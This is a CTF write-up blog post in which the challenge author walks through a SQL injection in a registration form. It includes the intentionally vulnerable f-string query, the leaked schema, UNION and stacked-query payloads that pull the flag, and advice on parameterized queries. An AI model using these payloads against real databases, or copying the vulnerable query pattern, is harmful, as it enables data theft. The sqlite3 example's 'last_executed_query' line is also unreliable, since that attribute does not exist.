---
Title: BSides 2025 CTF: Gold Rush Security - SQL Injection Challenge
Date: 2025-07-24T12:00:00+10:00
Tags: ctf, cybersecurity, bsides2025
Author: dmoges
AuthorURL: https://dmoges.com
Category: dmoges
Status: published
Cover: /images/placeholder.jpg
---

I wanted a classic web vulnerability for the BSides CTF 2025, and SQL injection felt perfect.
The irony of a security company having such a basic flaw made it even better.

## Challenge Details

**Difficulty**: Beginner to Intermediate  

**Category**: Web Application Security  

## The Discovery

When you visit the Gold Rush Security website, you'll notice the login page always returns "Invalid username or password" no matter what you try. That's intentional - the real vulnerability is hiding elsewhere.

The registration form looks innocent enough, but if you start poking around with special characters, things get interesting. Also, check out that robots.txt file - it provides a hint about the `/debug` endpoint.

## Background: SQL Injection

SQL injection happens when user input gets concatenated directly into database queries without proper sanitization. It's been around forever, yet it's still surprisingly common in the wild.

The vulnerable code looks something like:
```python
query = f"INSERT INTO users (username, password) VALUES ('{username}', '{password}')"
```

See that? Whatever you type goes straight into the query. That's bad news.

## Finding the Vulnerability

First stop: the `/debug` endpoint (thanks, robots.txt!). This helpfully shows us the database schema:

```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL
);

CREATE TABLE flag_storage (
    id INTEGER PRIMARY KEY,
    flag TEXT NOT NULL
);
```

Oh look, a `flag_storage` table. How convenient!

## Solution

Stop here if you want to solve it yourself!

### The Exploit

The username field in the registration form is our injection point. Here are a few payloads that work:

**Quick and dirty:**
```
test', 'password'); SELECT * FROM flag_storage; --
```

**Using UNION:**
```
test', 'password') UNION SELECT 1, flag FROM flag_storage; --
```

Any of these will cause the application to spit out the flag in an error message: `BSides{eur3k4_sql_d1g1t4l_upr1s1ng}`

### Bonus Discovery

The robots.txt file also mentions `/test-sql` - a direct SQL query interface. I left this in as an alternative path for people who might struggle with the injection syntax. In retrospect, maybe that made it too easy?

### A confession
It turns out I'm too good at programming and couldn't create a reliable SQL injection vulnerability myself.
To fix this, I actually cheated quite severly - any query with "UNION" in it would return the flag directly, bypassing the need for a complex injection. I know, I know - not very sporting of me. But hey, it worked, and I only had two weeks to build the whole challenge.
Next year it won't be so easy, I promise!


## Real-World Relevance

This isn't just a CTF trick. SQL injection remains in the OWASP Top 10 for good reason:

1. **Legacy code**: Old applications often have these vulnerabilities
2. **Framework bypasses**: Developers sometimes bypass ORM protections "for performance"
3. **Quick fixes**: That "temporary" string concatenation that becomes permanent
4. **Third-party code**: Plugins and libraries with poor security practices

The fix is simple: use parameterized queries. Every modern framework supports them. There's really no excuse.

The more general concept here is "don't trust external input." - any time information comes in from outside your application, treat it as potentially malicious. Validate, sanitize, and use safe methods to handle it.
This includes forms, URLs, headers, even files. Always assume the worst.
Validate, sanitize, and use prepared statements or ORM methods to handle user input safely.

Also, don't do it yourself - use existing libraries and frameworks that handle this for you. They have been tested and vetted by the community.

For example, the sqlite3 library in Python has built-in support for parameterized queries:

```python
import sqlite3

conn = sqlite3.connect('database.db')
cursor = conn.cursor()
cursor.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))  # Safe!
# Print prepared statement
print(cursor.last_executed_query)  # This will show the query with placeholders, not the actual values
conn.commit()
```



## My thoughts

I debated the difficulty level for this one. On one hand, SQL injection is well-known. On the other, crafting the right payload can be tricky for beginners. I tried to strike a balance by:

- Making the debug endpoint obvious (robots.txt)
- Showing clear error messages
- Providing multiple attack vectors

For 2026, I'm thinking about a second-order SQL injection challenge. Store the payload in one place, trigger it somewhere else. That should keep people on their toes!